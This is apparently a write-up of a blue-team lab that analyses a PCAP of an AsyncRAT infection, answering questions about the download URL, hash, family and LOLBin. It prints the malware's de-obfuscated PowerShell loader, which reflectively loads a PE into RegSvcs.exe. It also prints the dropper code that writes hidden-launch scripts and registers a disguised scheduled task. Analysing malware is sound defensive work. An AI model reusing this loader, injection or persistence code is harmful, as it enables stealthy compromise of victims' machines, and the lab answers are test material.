# XLMRat Lab

![photo1](https://miro.medium.com/v2/resize:fit:720/format:webp/1*suSjTi5JKL8Td5be0_0NIg.png)

## Scenario

A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

## Let's move on to the questions:

> The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

We begin by opening the .pcap file in Wireshark (attached with the challenge). To identify the target URL, we filter for HTTP requests. By reviewing the hint provided with the answer, it became clear which specific request to focus on. Tracing that request revealed the complete URL path.

![photo2](https://miro.medium.com/v2/resize:fit:720/format:webp/1*t4TNpj180I0Yfw2Q5Ad8nw.png)

**http://45.126.209.4:222/mdm.jpg**

> 2. Which hosting provider owns the associated IP address?

![photo3](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Xs-x8vGGa2UMFke73q7-TQ.png)

**ReliableSite.net**

> By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

So I need to extract the malware from file.pcap.

![photo4](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Go3XWu_tOTwADnNrqZfRwg.png)

Copy the “hexString_bbb” in cyberchef with the filter: From hex. Save the Output (file.exe).

![photo5](https://miro.medium.com/v2/resize:fit:720/format:webp/1*q0ANRVaST8Thd3zGBa05PQ.png)

So, use the command: 

```bash 
sha256sum file.exe # 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
```

**1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798**

> 4. What is the malware family label based on Alibaba?

Ok, now we need to use **VirusTotal**. Upload the malware to the site…

![photo6](https://miro.medium.com/v2/resize:fit:720/format:webp/1*koI8r4yzF-pKwiZcurXh_w.png)

**asyncrat**

> 5. What is the timestamp of the malware’s creation?

Go to section **details**:

![photo](https://miro.medium.com/v2/resize:fit:720/format:webp/1*PerUA4SxsWlbbxamyi6JGA.png)

**2023–10–30 15:08**

> 6. Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

Under the hex of the malware, there’s some interesting code. Just like in the code, I remove the # and get the response.

```bash
Sleep 5
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5
$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)


$NK = $Fu.GetType('N#ew#PE#2.P#E'-replace  '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow############s\Mi####cr'-replace  '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace  '#', ''
$VA = @($AC, $NKbb)

$CM = 'In#################vo################ke'-replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)
```

**C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe**

> 7. The script is designed to drop several files. List the names of the files dropped by the script.

```bash
$Content = @'@e%Conted%%Conted% offset "ps=powershell.exe"set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"set "cmd=C:\Users\Public\Conted.ps1"%ps% %Contedms% -Command "& '%cmd%'"exit /b'@[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)$Content = @'on error resume nextFunction CreateWshShellObj()Dim objNameobjName = "WScript.Shell"Set CreateWshShellObj = CreateObject(objName)End FunctionFunction GetFilePath()Dim filePathfilePath = "C:\Users\Public\Conted.bat"GetFilePath = filePathEnd FunctionFunction GetVisibilitySetting()Dim visibilityvisibility = 0GetVisibilitySetting = visibilityEnd FunctionFunction RunFile(wshShellObj, filePath, visibility)wshShellObj.Run filePath, visibilityEnd FunctionSet wshShellObj = CreateWshShellObj()filePath = GetFilePath()visibility = GetVisibilitySetting()Call RunFile(wshShellObj, filePath, visibility)'@[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)Sleep 2$scheduler = New-Object -ComObject Schedule.Service$scheduler.Connect()$taskDefinition = $scheduler.NewTask(0)$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"$taskDefinition.Settings.Enabled = $true$taskDefinition.Settings.DisallowStartIfOnBatteries = $false$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")$trigger.Repetition.Interval = "PT2M"# .......... ...... Action$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction$action.Path = "C:\Users\Public\Conted.vbs"$taskFolder = $scheduler.GetFolder("\")$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
```

**Conted.vbs, Conted.ps1, Conted.bat**